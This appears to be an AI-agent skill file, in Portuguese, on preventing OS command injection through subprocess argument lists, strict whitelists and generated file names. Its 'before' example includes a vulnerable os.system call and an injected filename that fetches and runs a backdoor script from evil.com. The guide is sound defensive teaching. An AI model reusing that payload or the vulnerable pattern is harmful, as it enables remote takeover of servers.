---
name: rs-seguranca-devs-execucao-comandos-so
description: "Guards against OS command injection when application code calls system commands (os.system, subprocess, shell_exec, exec). Use when user asks to 'run a shell command', 'call a CLI tool', 'execute a process', 'optimize files with CLI', or any code that spawns OS processes. Ensures user input never reaches command strings unsanitized. Make sure to use this skill whenever generating code that invokes system commands, even for seemingly harmless utilities. Not for SQL injection, XSS, or general input validation unrelated to shell execution."
---

# Execucao de Comandos do SO

> Nunca passe entrada do usuario diretamente para comandos do sistema operacional — isso equivale a entregar o controle total da maquina ao atacante.

## Rules

1. **Prefira bibliotecas nativas** — use uma biblioteca da linguagem ao inves de chamar CLI via shell, porque bibliotecas nao abrem um shell interpretador
2. **Nunca use entrada do usuario em comandos** — gere nomes, paths e parametros internamente (ex: `secrets.token_hex(8)`), porque qualquer caractere especial (`;`, `&`, `|`, `` ` ``, `$()`) pode injetar comandos
3. **Se precisar de input do usuario, valide com whitelist estrita** — apenas `[a-zA-Z0-9_]` (regex `\w`), porque ponto-e-virgula, pipe, ampersand, cifrão, acento grave e barra — todos permitem execucao de comandos
4. **Use subprocess com lista de argumentos, nunca shell=True** — `subprocess.run(["svgo", filename])` nao `os.system(f"svgo {filename}")`, porque lista de args nao passa pelo interpretador shell
5. **Trate como takeover da maquina** — command injection nao e um bug menor, e controle total do servidor (download de scripts, execucao remota, exfiltracao de dados)

## How to write

### Sem input do usuario (preferido)

```python
import secrets

# Gere o nome internamente — usuario nao tem influencia
filename = secrets.token_hex(8) + ".svg"
filepath = os.path.join("original", filename)
file.save(filepath)

# Seguro: nenhum dado do usuario no comando
subprocess.run(["svgo", filepath, "-o", os.path.join("optimized", filename)])
```

### Com input do usuario (ultima opcao)

```python
import re

user_input = request.form.get("theme_name", "")

# Whitelist ESTRITA: apenas alfanumerico e underline
if not re.fullmatch(r'\w+', user_input):
    abort(400, "Nome invalido: apenas letras, numeros e underline")

# Agora e seguro usar
subprocess.run(["generate-theme", user_input])
```

## Example

**Before (vulneravel — takeover da maquina):**

```python
filename = file.filename  # entrada do usuario!
file.save(os.path.join("original", filename))
os.system(f"svgo original/{filename} -o optimized/{filename}")
# Atacante envia filename: "x.svg; wget http://evil.com/backdoor.sh; bash backdoor.sh;"
```

**After (seguro):**

```python
import secrets
filename = secrets.token_hex(8) + ".svg"
file.save(os.path.join("original", filename))
subprocess.run(["svgo", f"original/{filename}", "-o", f"optimized/{filename}"])
```

## Heuristics

| Situacao | Acao |
|----------|------|
| Precisa chamar CLI tool (svgo, ffmpeg, imagemagick) | Buscar biblioteca nativa primeiro; se nao existir, subprocess com lista de args |
| Usuario fornece nome de arquivo | Ignorar o nome, gerar com `secrets.token_hex()` ou UUID |
| Usuario escolhe parametro (tema, formato, opcao) | Whitelist de valores permitidos, nunca string livre |
| Precisa de `os.system()` ou `shell=True` | BLOCK — reescrever com `subprocess.run([...])` |

## Anti-patterns

| Nunca escreva | Escreva ao inves |
|---------------|------------------|
| `os.system(f"cmd {user_input}")` | `subprocess.run(["cmd", safe_value])` |
| `subprocess.Popen(cmd, shell=True)` | `subprocess.Popen(["cmd", "arg1", "arg2"])` |
| `filename = request.files['f'].filename` para uso em shell | `filename = secrets.token_hex(8) + ext` |
| Validar apenas `;` e `&` | Whitelist `\w+` — bloquear TUDO exceto alfanumerico |
| `shell_exec($userInput)` (PHP) | `escapeshellarg()` + whitelist estrita |

## Deep reference library

- [deep-explanation.md](references/deep-explanation.md) — Raciocínio completo do instrutor, analogias e edge cases
- [code-examples.md](references/code-examples.md) — Todos os exemplos de código expandidos com variações


---

## Deep dive
- [Deep explanation](../../../data/skills/seguranca-para/rs-seguranca-para-devs-execucao-de-comandos-do-so-em-aplicacoes/references/deep-explanation.md)
- [Code examples](../../../data/skills/seguranca-para/rs-seguranca-para-devs-execucao-de-comandos-do-so-em-aplicacoes/references/code-examples.md)
